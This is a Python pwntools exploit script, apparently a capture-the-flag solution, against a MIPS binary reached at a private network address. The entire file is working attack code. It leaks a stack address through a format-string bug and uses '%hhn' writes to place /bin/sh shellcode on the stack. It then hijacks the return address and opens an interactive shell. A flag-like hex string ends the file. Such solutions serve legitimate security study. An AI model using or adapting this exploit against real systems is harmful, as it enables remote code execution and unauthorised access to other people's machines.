#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian

from lianpwn import *

# io = process(["qemu-mips", "-g", "12345", "pwn"])
# io = process(["qemu-mips", "pwn"])
io = remote("192.168.18.27", 9999)
elf = ELF("./pwn")

context.log_level = "debug"
context.arch = "mips"
context.endian = "big"
context.bits = 32
context.terminal = ["tmux", "sp", "-h", "-l", "140"]


def ru(a, drop=False):
    return io.recvuntil(a, drop)


rl = lambda a=False: io.recvline(a)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))


class strFmt_new:
    def __init__(self):
        self.current_n = 0

    def generate_hhn_payload(self, distance, hhn_data):
        hhn_data = hhn_data & 0xFF
        offset = (distance // 4) + 6
        if hhn_data > self.current_n:
            temp = hhn_data - self.current_n
        elif hhn_data < self.current_n:
            temp = 0x100 - self.current_n + hhn_data
        elif hhn_data == self.current_n:
            return b"%" + i2b(offset) + b"$hhn"
        self.current_n = hhn_data
        return b"%" + i2b(temp) + b"c%" + i2b(offset) + b"$hhn"


# a1, a2, a3, sp+0x10...

ru(b">> \n")
payload = b"%p."
s(payload)
stack_base = int(ru(b".", drop=True), 16)
lg("stack_base", stack_base)


def change_word(offset, one_2B_data):
    fmt = strFmt_new()
    ru(b">> \n")
    payload = fmt.generate_hhn_payload(0x18, (one_2B_data >> 8) & 0xFF)
    payload += fmt.generate_hhn_payload(0x1C, one_2B_data & 0xFF)
    lg("len(payload)", len(payload))
    assert len(payload) <= 0x20 - 0x8
    payload = payload.ljust(0x20 - 0x8, b"\x00")
    payload += p32(stack_base + offset)
    payload += p32(stack_base + offset + 1)
    s(payload)


def construct_ROP(off, one_4B_data):
    change_word(off * 4 + 0x24, (one_4B_data >> 16) & 0xFFFF)
    change_word(off * 4 + 0x24 + 2, one_4B_data & 0xFFFF)


shellcode = asm(shellcraft.sh()) + asm("nop")
shellcode_list = [u32((shellcode[k * 4 :])[:4]) for k in range(len(shellcode) // 4)]
print(shellcode_list)

construct_ROP(0, stack_base + 0x28)

for x in range(len(shellcode_list)):
    construct_ROP(x + 1, shellcode_list[x])

ru(b">> \n")
sl(b"exit")

ia()

# 4c87688354a546ecadd6d437b60306a5
